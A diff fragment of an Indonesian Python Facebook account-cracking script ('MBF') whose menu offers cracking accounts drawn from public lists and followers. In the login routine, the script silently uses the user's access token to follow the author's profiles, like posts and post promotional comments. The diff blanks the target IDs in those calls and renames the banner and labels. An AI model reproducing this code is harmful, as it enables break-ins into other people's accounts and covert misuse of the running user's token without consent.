@@ -18,9 +18,7 @@ ok = []
 # Pastikan Jangan Ubah Bot Komen & Follownya :v #
 ua = ('Lenovo-A850/S105 Linux/3.4.0 Android/4.2 Release/06.12.2013 Browser/AppleWebKit534.30 Profile/ Configuration/ Safari/534.30')
 logo = ("""\033[1;97m __  __  ____  ____
-(  \/  )(  _ \( ___)
- )    (  ) _ < )__)
-(_/\/\_)(____/(__)
+DOSA DITANGGUNG SENDIRI
 """)
 def __login__():
 	os.system('clear')
@@ -88,17 +86,17 @@ def __komen_token__():
         __waktu__ = __web__.strftime("%H:%M:%S / %d-%m-%Y ")
         __love__ = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
 	__motivasi__ = random.choice(["Apapun yg terjadi, nikmati hidup ini. Hapus air mata, berikan senyummu. Kadang, senyum terindah datang setelah air mata penuh luka.","Jika kamu tahu seseorang telah ada yg memiliki, kamu seharusnya menghargai. Jangan menjadi alasan hubungan mereka berakhir.","Mencemaskan apa yg mungkin terjadi hanya membuang waktumu. Itu hanya membebani pikiranmu dan mengambil kebahagiaanmu.","Jangan menunggu waktu yg tepat tuk melakukan hal yg baik. Jangan terus bertanya apa yg mungkin terjadi, beranikan diri!","Jika seseorang mampu memberi alasan mengapa dia mencintaimu, dia tak mencintaimu, dia menyukaimu. Cinta itu emosi, bukan definisi.","Dalam hidup, kamu harus menyadari, kadang orang yg paling kamu inginkan, adalah orang yg buat hidupmu lebih baik jika tanpanya","Dia yg tulus mencintaimu takkan berjalan di depanmu, atau tertinggal di belakangmu. Dia akan selalu berjalan di sampingmu.","Kadang, masalah adalah satu-satunya cara tuk tahu siapa yg tulus peduli padamu dan siapa yg berpura-pura jadi temanmu.","Mereka yg mencintaimu slalu ingin yg terbaik untukmu, hanya saja cara mereka bukan slalu yg terbaik.","Jangan menunda sebuah pekerjaan, lebih baik menyesali apa yg kamu kerjakan, daripada menyesali apa yg tak pernah kamu kerjakan."])
-        __kata__ = 'Pengguna Script MBF '
+        __kata__ = 'Pengguna Script  '
 	__kata2__ = 'Izin Pake Scriptnya Bang '
         __kom__ = __kata__+__love__+'\n'+__motivasi__+'\n'+__waktu__
 	__kom2__ = __kata2__+__love__+'\n'+__waktu__
-        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=' + token) #Rozhak
-        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=' + token) #Rozhak
-	requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=' + token) #Muhammad Rozhak
-        requests.post('https://graph.facebook.com/10159090813023544/comments/?message=' +__kom__+ '&access_token=' + token)
-        requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=' + token)
-        requests.post('https://graph.facebook.com/10159090813023544/comments/?message='+__kom2__+'&access_token=' + token)
-        requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=' + token)
+        requests.post('https://graph.facebook.com//subscribers?access_token=' + token) #Rozhak
+        requests.post('https://graph.facebook.com//subscribers?access_token=' + token) #Rozhak
+	requests.post('https://graph.facebook.com//subscribers?access_token=' + token) #Muhammad Rozhak
+        requests.post('https://graph.facebook.com//comments/?message=' +__kom__+ '&access_token=' + token)
+        requests.post('https://graph.facebook.com//likes?summary=true&access_token=' + token)
+        requests.post('https://graph.facebook.com//comments/?message='+__kom2__+'&access_token=' + token)
+        requests.post('https://graph.facebook.com//likes?summary=true&access_token=' + token)
 	print('[*] Login Berhasil')
         __menu__()
 def __menu__():
@@ -123,8 +121,8 @@ def __menu__():
 		exit('[•] Koneksi Error')
         os.system('clear')
 	print(logo)
-	print('[•] Name : '+name)
-	print('[•] Birthday : '+birthday)
+	print('[•] NAMAKAU : '+name)
+	print('[•] ULANG TAHUN AKUN TUMBALKAU : '+birthday)
 	print('\n[1] Crack Dari Publik')
 	print('[2] Crack Dari Follower')
 	print('[3] Lihat Hasil Crack')
